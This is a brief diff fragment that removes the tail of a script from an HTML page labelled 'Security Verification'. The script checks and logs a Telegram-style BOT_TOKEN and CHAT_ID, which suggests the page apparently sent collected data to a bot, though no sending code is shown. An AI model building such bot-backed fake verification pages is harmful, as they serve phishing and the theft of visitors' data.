-    if (CHAT_ID === "YOUR_CHAT_ID") {
-        log('⚠️ WARNING: CHAT_ID not set! Edit the script.', 'error');
-    } else {
-        log('✅ CHAT_ID configured', 'success');
-    }
-});
-
-console.log('🔴 Security Verification page loaded');
-console.log('📤 BOT_TOKEN:', BOT_TOKEN);
-console.log('📤 CHAT_ID:', CHAT_ID);
-</script>
 </body>
 </html>
